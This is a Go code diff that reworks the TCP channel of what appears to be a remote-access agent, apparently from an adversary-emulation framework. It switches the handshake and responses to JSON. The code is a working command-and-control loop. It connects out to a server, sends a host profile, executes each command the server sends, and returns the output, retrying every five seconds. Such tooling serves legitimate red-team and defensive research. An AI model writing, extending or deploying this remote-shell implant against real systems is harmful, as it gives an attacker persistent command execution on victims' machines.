@@ -6,7 +6,7 @@ import (
 	"net"
 	"time"
 	"strings"
-	"strconv"
+	"encoding/json"
 
 	"../commands"
 	"../output"
@@ -19,42 +19,39 @@ func init() {
 	CommunicationChannels["tcp"] = TCP{}
 }
 
-var shellInfo, paw, httpServer, terminalKey string
-
 //Listen through a new socket connection
-func (contact TCP) Listen(key string, port string, server string, inbound int, profile string) {
-	httpServer = server
-	shellInfo = profile
-	terminalKey = key
+func (contact TCP) Listen(port string, server string, inbound int, profile map[string]interface{}) {
 	for {
 	   conn, err := net.Dial("tcp", port)
 	   if err != nil {
 		  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
 	   } else {
-		   paw := handshake(conn)
-		   output.VerbosePrint("[+] TCP established")
-		   listen(conn, []byte(fmt.Sprintf("%s$", paw)))
+		   handshake(conn, profile)
+		   output.VerbosePrint(fmt.Sprintf("[+] TCP established for %s", profile["paw"]))
+		   listen(conn, profile, server)
 	   }
 	   time.Sleep(5 * time.Second)
 	}
  }
 
-func listen(conn net.Conn, paw []byte) {
+func listen(conn net.Conn, profile map[string]interface{} , server string) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
         message := scanner.Text()
-        bites, status := commands.RunCommand(strings.TrimSpace(message), httpServer)
-        statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
-        response := append(paw, statusBites...)
-        conn.Write(append(response, bites...))
+		
+		bites, status := commands.RunCommand(strings.TrimSpace(message), server)
+		response := make(map[string]interface{})
+		response["response"] = string(bites)
+		response["status"] = status
+		jdata, _ := json.Marshal(response)
+		conn.Write(jdata)
     }
 }
 
-func handshake(conn net.Conn) string {
+func handshake(conn net.Conn, profile map[string]interface{}) {
 	//write the profile
-    conn.Write([]byte(terminalKey))
-    conn.Write([]byte("\n"))
-    conn.Write([]byte(shellInfo))
+	jdata, _ := json.Marshal(profile)
+    conn.Write(jdata)
 	conn.Write([]byte("\n"))
 
 	//read back the paw
@@ -62,6 +59,5 @@ func handshake(conn net.Conn) string {
     n, _ := conn.Read(data)
     paw := string(data[:n])
     conn.Write([]byte("\n"))
-    return strings.TrimSpace(string(paw))
+	profile["paw"] = strings.TrimSpace(string(paw))
 }
-
